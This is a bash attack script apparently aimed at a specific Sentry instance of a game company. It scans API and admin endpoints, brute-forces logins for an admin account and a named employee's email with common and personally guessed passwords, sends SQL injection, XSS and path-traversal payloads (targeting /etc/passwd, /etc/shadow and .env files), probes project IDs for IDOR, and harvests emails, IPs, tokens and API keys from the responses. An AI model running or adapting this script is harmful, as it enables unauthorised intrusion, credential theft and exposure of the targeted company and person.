#!/bin/bash

echo "====================================="
echo "  SENTRY SCANNER - ALL IN ONE"
echo "====================================="
echo "Started: $(date)"
echo ""

mkdir -p sentry_results
BASE="https://sentry.madout.games"

CSRF_TOKENS=(
  "07ddENH90AuMVAI9dmC8N84v5QoloMRRe9Urn3BxZHSaah2NkblJmzh2H8lu2YJ8"
  "Fw7IlC3PGBzWrfYAfiyxGE8WfpKcC9Ypw2CZtBK6ZAE3ZXzj5yPQq0cde9qhJrIv"
  "BC2yydWHwTWLIxARzcExKFTHBfo62Ddw49EwhED5m2wEhfL3hxVBKGkCqijrdXt7"
)

echo "[1] Scanning Sentry..."
curl -k -s "$BASE/" > sentry_results/home.html
echo "Home saved"

echo ""
echo "[2] Scanning API endpoints..."
endpoints=(
  "/api/0/"
  "/api/0/projects/"
  "/api/0/organizations/"
  "/api/0/events/"
  "/api/0/issues/"
  "/api/0/users/"
  "/api/0/teams/"
  "/api/0/releases/"
  "/api/0/deploys/"
  "/api/0/monitors/"
  "/api/0/alerts/"
  "/api/0/rules/"
  "/api/0/dashboards/"
  "/api/0/discover/"
  "/api/0/profiles/"
  "/api/0/spans/"
  "/api/0/transactions/"
  "/api/0/errors/"
  "/api/0/performance/"
  "/api/0/metrics/"
  "/api/0/sessions/"
  "/api/0/replays/"
  "/api/0/feedback/"
  "/api/0/attachments/"
  "/api/0/tags/"
  "/api/0/contexts/"
  "/api/0/breadcrumbs/"
  "/api/0/sdk/"
  "/api/0/options/"
  "/api/0/config/"
  "/api/0/settings/"
  "/api/0/stats/"
  "/api/0/history/"
  "/api/0/logs/"
  "/api/0/traces/"
  "/api/0/system/status/"
)

for endpoint in "${endpoints[@]}"; do
  echo -n "Testing $endpoint... "
  response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$endpoint")
  if [ "$response" == "200" ] || [ "$response" == "302" ]; then
    echo "FOUND! ($response)"
    curl -k -s "$BASE$endpoint" > "sentry_results/api_${endpoint//\//_}.html"
  else
    echo "NO ($response)"
  fi
done

echo ""
echo "[3] Scanning admin endpoints..."
admin_endpoints=(
  "/admin/"
  "/admin/auth/user/"
  "/admin/sentry/"
  "/admin/sentry/user/"
  "/admin/sentry/organization/"
  "/admin/sentry/project/"
  "/admin/sentry/team/"
  "/admin/sentry/member/"
  "/admin/sentry/event/"
  "/admin/sentry/issue/"
  "/admin/sentry/release/"
  "/admin/sentry/deploy/"
  "/admin/sentry/monitor/"
  "/admin/sentry/alert/"
  "/admin/sentry/rule/"
  "/admin/sentry/dashboard/"
  "/admin/sentry/discover/"
  "/admin/sentry/profile/"
  "/admin/sentry/span/"
  "/admin/sentry/transaction/"
  "/admin/sentry/error/"
  "/admin/sentry/performance/"
  "/admin/sentry/metric/"
  "/admin/sentry/session/"
  "/admin/sentry/replay/"
  "/admin/sentry/feedback/"
  "/admin/sentry/attachment/"
  "/admin/sentry/tag/"
  "/admin/sentry/context/"
  "/admin/sentry/breadcrumb/"
  "/admin/sentry/sdk/"
  "/admin/sentry/option/"
  "/admin/sentry/config/"
  "/admin/sentry/setting/"
  "/admin/sentry/stat/"
  "/admin/sentry/history/"
  "/admin/sentry/log/"
  "/admin/sentry/trace/"
  "/admin/sentry/status/"
  "/admin/sentry/system/"
  "/admin/sentry/health/"
  "/admin/sentry/ready/"
  "/admin/sentry/live/"
  "/admin/sentry/startup/"
  "/admin/sentry/shutdown/"
  "/admin/sentry/restart/"
  "/admin/sentry/reload/"
  "/admin/sentry/deploy/"
  "/admin/sentry/rollback/"
  "/admin/sentry/feature/"
  "/admin/sentry/flag/"
  "/admin/sentry/toggle/"
  "/admin/sentry/experiment/"
  "/admin/sentry/beta/"
  "/admin/sentry/preview/"
  "/admin/sentry/canary/"
)

for endpoint in "${admin_endpoints[@]}"; do
  echo -n "Testing $endpoint... "
  response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$endpoint")
  if [ "$response" == "200" ] || [ "$response" == "302" ]; then
    echo "FOUND! ($response)"
    curl -k -s "$BASE$endpoint" > "sentry_results/admin_${endpoint//\//_}.html"
  else
    echo "NO ($response)"
  fi
done

echo ""
echo "[4] Brute force login..."
passwords=(
  "admin"
  "password"
  "123456"
  "qwerty"
  "admin123"
  "sentry"
  "madout"
  "test"
  "password123"
  "adminadmin"
  "letmein"
  "welcome"
  "monkey"
  "dragon"
  "master"
  "changeme"
  "123456789"
  "qwerty123"
  "password1"
  "Admin123"
  "MadOut2026"
  "Roman1985"
)

for csrf in "${CSRF_TOKENS[@]}"; do
  for pass in "${passwords[@]}"; do
    echo -n "Trying admin:$pass... "
    response=$(curl -k -s -X POST "$BASE/auth/login/sentry/" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Referer: $BASE/auth/login/sentry/" \
      -H "Cookie: csrftoken=$csrf" \
      -d "csrfmiddlewaretoken=$csrf" \
      -d "op=login" \
      -d "username=admin" \
      -d "password=$pass" \
      -d "organization=sentry" \
      -w "%{http_code}" \
      -o /dev/null)
    if [ "$response" == "302" ] || [ "$response" == "200" ]; then
      echo "SUCCESS! Password: $pass"
      echo "admin:$pass" >> sentry_results/cracked.txt
      echo "CSRF: $csrf" >> sentry_results/cracked.txt
      break 2
    else
      echo "FAIL"
    fi
  done
done

# Email brute
email="roman.sichenko@madoutgames.com"
for csrf in "${CSRF_TOKENS[@]}"; do
  for pass in "${passwords[@]}"; do
    echo -n "Trying $email:$pass... "
    response=$(curl -k -s -X POST "$BASE/auth/login/sentry/" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Referer: $BASE/auth/login/sentry/" \
      -H "Cookie: csrftoken=$csrf" \
      -d "csrfmiddlewaretoken=$csrf" \
      -d "op=login" \
      -d "username=$email" \
      -d "password=$pass" \
      -d "organization=sentry" \
      -w "%{http_code}" \
      -o /dev/null)
    if [ "$response" == "302" ] || [ "$response" == "200" ]; then
      echo "SUCCESS! Password: $pass"
      echo "$email:$pass" >> sentry_results/cracked.txt
      echo "CSRF: $csrf" >> sentry_results/cracked.txt
      break 2
    else
      echo "FAIL"
    fi
  done
done

echo ""
echo "[5] SQL Injection..."
sql_payloads=(
  "'"
  "' OR '1'='1"
  "'-- -"
  "1' OR '1'='1'"
  "admin'-- -"
  "admin' OR '1'='1"
  "1' AND 1=1-- -"
)

for csrf in "${CSRF_TOKENS[@]}"; do
  for payload in "${sql_payloads[@]}"; do
    echo -n "SQLi: $payload... "
    response=$(curl -k -s -X POST "$BASE/auth/login/sentry/" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Referer: $BASE/auth/login/sentry/" \
      -H "Cookie: csrftoken=$csrf" \
      -d "csrfmiddlewaretoken=$csrf" \
      -d "op=login" \
      -d "username=$payload" \
      -d "password=anything" \
      -d "organization=sentry" \
      -w "%{http_code}" \
      -o /dev/null)
    if [ "$response" == "500" ]; then
      echo "VULNERABLE! ($response)"
      echo "SQLi: $payload" >> sentry_results/sqli.txt
    elif [ "$response" == "302" ]; then
      echo "SUCCESS! ($response)"
    else
      echo "NO ($response)"
    fi
  done
done

echo ""
echo "[6] XSS Testing..."
xss_payloads=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "javascript:alert(1)"
  "'><script>alert(1)</script>"
  "\"><script>alert(1)</script>"
)

for payload in "${xss_payloads[@]}"; do
  echo -n "XSS: $payload... "
  response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE/issues/?query=$payload")
  if [ "$response" == "200" ]; then
    echo "POTENTIAL XSS!"
    echo "XSS: $payload" >> sentry_results/xss.txt
  else
    echo "NO ($response)"
  fi
done

echo ""
echo "[7] Path Traversal..."
traversal_payloads=(
  "../../../../etc/passwd"
  "../../../../etc/shadow"
  "../../../../etc/hosts"
  "../../../../etc/hostname"
  "../../../../proc/self/environ"
  "../../../../.env"
  "../../../.env"
  "../../.env"
  "../.env"
)

for payload in "${traversal_payloads[@]}"; do
  echo -n "Path: $payload... "
  response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE/$payload")
  if [ "$response" == "200" ] || [ "$response" == "403" ] || [ "$response" == "500" ]; then
    echo "FOUND! ($response)"
    echo "Path: $payload" >> sentry_results/traversal.txt
    curl -k -s "$BASE/$payload" > "sentry_results/traversal_$(echo $payload | tr '/' '_').html"
  else
    echo "NO ($response)"
  fi
done

echo ""
echo "[8] IDOR Testing..."
for id in {1..50}; do
  echo -n "Project ID: $id... "
  response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE/api/0/projects/$id/")
  if [ "$response" == "200" ]; then
    echo "FOUND!"
    echo "Project: $id" >> sentry_results/idor.txt
    curl -k -s "$BASE/api/0/projects/$id/" > "sentry_results/idor_${id}.json"
  else
    echo "NO ($response)"
  fi
done

echo ""
echo "[9] Extracting sensitive data..."
for file in sentry_results/*.html sentry_results/*.json; do
  if [ -f "$file" ]; then
    grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" "$file" >> sentry_results/emails.txt
    grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" "$file" >> sentry_results/ips.txt
    grep -oE "[a-zA-Z0-9_\-]{32,}" "$file" >> sentry_results/tokens.txt
    grep -oE "sk-[a-zA-Z0-9]{32,}" "$file" >> sentry_results/api_keys.txt
  fi
done

# Unique sort
sort -u sentry_results/emails.txt -o sentry_results/emails.txt
sort -u sentry_results/ips.txt -o sentry_results/ips.txt
sort -u sentry_results/tokens.txt -o sentry_results/tokens.txt
sort -u sentry_results/api_keys.txt -o sentry_results/api_keys.txt

echo ""
echo "[10] FINAL REPORT"
echo "====================================="
echo "RESULTS SAVED TO: sentry_results/"
echo ""
echo "Files generated:"
ls -la sentry_results/
echo ""
echo "====================================="
echo "FINDINGS SUMMARY:"
echo "====================================="
echo ""
echo "Emails found: $(cat sentry_results/emails.txt 2>/dev/null | wc -l)"
echo "IPs found: $(cat sentry_results/ips.txt 2>/dev/null | wc -l)"
echo "Tokens found: $(cat sentry_results/tokens.txt 2>/dev/null | wc -l)"
echo "API Keys found: $(cat sentry_results/api_keys.txt 2>/dev/null | wc -l)"
echo ""
echo "Cracked passwords:"
cat sentry_results/cracked.txt 2>/dev/null || echo "None found"
echo ""
echo "SQLi vulnerabilities:"
cat sentry_results/sqli.txt 2>/dev/null || echo "None found"
echo ""
echo "XSS vulnerabilities:"
cat sentry_results/xss.txt 2>/dev/null || echo "None found"
echo ""
echo "Path traversal:"
cat sentry_results/traversal.txt 2>/dev/null || echo "None found"
echo ""
echo "IDOR vulnerabilities:"
cat sentry_results/idor.txt 2>/dev/null || echo "None found"
echo ""
echo "====================================="
echo "SCAN COMPLETE: $(date)"
echo "====================================="
